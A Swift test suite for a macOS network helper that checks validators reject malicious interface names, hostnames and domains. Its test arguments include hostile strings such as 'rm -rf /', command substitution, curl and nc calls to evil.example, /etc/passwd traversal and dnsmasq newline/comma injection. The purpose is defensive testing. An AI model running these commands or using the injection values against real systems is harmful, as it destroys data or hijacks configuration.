import Foundation
import Testing
import MacNetModels
import MacNetValidation

/// The malicious inputs named in the specification, verified to be rejected or safely contained.
///
/// These are the inputs an attacker — or an unlucky copy-paste — would use to turn a text
/// field into a command, a path, or an extra line of configuration. They are collected here,
/// separate from the per-validator suites, so the security surface is legible in one place
/// and so that adding a new input path means adding to a list someone will actually read.
@Suite("Malicious input handling")
struct SecurityInputTests {

    // MARK: - Shell metacharacters in an interface name

    @Test("rejects shell metacharacters in an interface name",
          arguments: ["en7;rm -rf /",
                      "en7$(whoami)",
                      "en7`whoami`",
                      "en7 && curl evil.example",
                      "en7|nc evil.example 1234",
                      "en7\nen0",
                      "$(reboot)",
                      "../../etc/passwd"])
    func rejectsShellMetacharactersInInterfaceName(input: String) {
        // The helper never passes an interface name through a shell — it uses an argument
        // array — so none of these could execute even if accepted. They are rejected anyway:
        // defence in depth costs nothing here, and a name like this has no legitimate use.
        if case .success = InterfaceName.validate(input) {
            Issue.record("interface name must be rejected: \(input.debugDescription)")
        }
    }

    // MARK: - Path traversal

    @Test("rejects path traversal wherever a name is accepted",
          arguments: ["../etc/passwd",
                      "../../etc/passwd",
                      "/etc/passwd",
                      "..",
                      "./config",
                      "%2e%2e%2fetc%2fpasswd"])
    func rejectsPathTraversal(input: String) {
        if case .success = InterfaceName.validate(input) {
            Issue.record("interface name must be rejected: \(input.debugDescription)")
        }
        if case .success = Hostname.resolve(input, localDomain: "lab.test") {
            Issue.record("hostname must be rejected: \(input.debugDescription)")
        }
        if case .success = DomainName.validateLocalDomain(input) {
            Issue.record("domain must be rejected: \(input.debugDescription)")
        }
    }

    // MARK: - Configuration injection

    @Test("rejects a newline that would start a new dnsmasq directive")
    func rejectsNewlineInjection() {
        // dnsmasq configuration is line-oriented. A name carrying a newline would add a
        // directive the user never wrote — here, an upstream server under someone else's
        // control.
        let payload = "hostname\nserver=1.2.3.4"

        if case .success = Hostname.resolve(payload, localDomain: "lab.test") {
            Issue.record("hostname with embedded newline must be rejected")
        }
        if case .success = DomainName.validateLocalDomain(payload) {
            Issue.record("domain with embedded newline must be rejected")
        }
    }

    @Test("rejects a comment marker that would disable the rest of a line")
    func rejectsCommentInjection() {
        // `#` starts a comment in both dnsmasq configuration and hosts files. A name ending
        // in one could comment out whatever the generator writes after it.
        let payload = "hostname#comment"

        if case .success = Hostname.resolve(payload, localDomain: "lab.test") {
            Issue.record("hostname with a comment marker must be rejected")
        }
        if case .success = DomainName.validateLocalDomain(payload) {
            Issue.record("domain with a comment marker must be rejected")
        }
    }

    @Test("rejects a comma that would smuggle a second value into a directive")
    func rejectsCommaInjection() {
        // Many dnsmasq options are comma-separated, so a value containing a comma becomes two
        // values.
        let payload = "1.2.3.4,server=evil"

        #expect(IPv4Address(payload) == nil)
        if case .success = Hostname.resolve(payload, localDomain: "lab.test") {
            Issue.record("hostname with a comma must be rejected")
        }
        if case .success = DomainName.validateLocalDomain(payload) {
            Issue.record("domain with a comma must be rejected")
        }
    }

    // MARK: - Comments are never configuration

    @Test("a record comment cannot reach the generated configuration")
    func commentIsNeverConfiguration() throws {
        // The specification: the comment field is UI-only and is written to neither the dnsmasq
        // config nor the hosts file. That is why it is the one field with no character
        // restrictions — it has nowhere dangerous to go. The rule is enforced by the config
        // generator's golden tests; recorded here so the reason is not lost.
        let record = LocalDNSRecord(
            hostname: "bmc01",
            ipv4Address: try #require(IPv4Address("192.168.50.20")),
            comment: "#\nserver=1.2.3.4\n"
        )
        #expect(record.comment.contains("server="))

        let issues = ConfigurationValidator.validate(profile(with: [record]))
        #expect(!ConfigurationValidator.hasBlockingIssues(issues))
    }

    @Test("an over-long comment is still rejected")
    func rejectsOverlongComment() throws {
        let record = LocalDNSRecord(
            hostname: "bmc01",
            ipv4Address: try #require(IPv4Address("192.168.50.20")),
            comment: String(repeating: "a", count: LocalDNSRecord.maximumCommentLength + 1)
        )
        let issues = ConfigurationValidator.validate(profile(with: [record]))
        #expect(ConfigurationValidator.hasBlockingIssues(issues))
    }

    // MARK: - Helpers

    private func profile(with records: [LocalDNSRecord]) -> NetworkProfile {
        NetworkProfile(
            name: "Test",
            interfaceConfiguration: InterfaceConfiguration(
                addTemporaryIPv4Alias: true,
                serverIPv4: IPv4Address(rawValue: 0xC0A8_3201),   // 192.168.50.1
                prefixLength: 24
            ),
            dhcpConfiguration: DHCPConfiguration(
                enabled: false,
                rangeStart: IPv4Address(rawValue: 0xC0A8_320A),
                rangeEnd: IPv4Address(rawValue: 0xC0A8_32C8),
                leaseDurationSeconds: 43_200,
                authoritative: true,
                advertiseRouter: false,
                routerIPv4: nil,
                advertiseLocalDNSServer: true
            ),
            dnsConfiguration: DNSConfiguration(
                enabled: true,
                localDomain: "lab.test",
                upstreamMode: .localOnly,
                customUpstreamServers: [],
                logQueries: false,
                records: records
            ),
            createdAt: Date(timeIntervalSince1970: 0),
            updatedAt: Date(timeIntervalSince1970: 0)
        )
    }
}
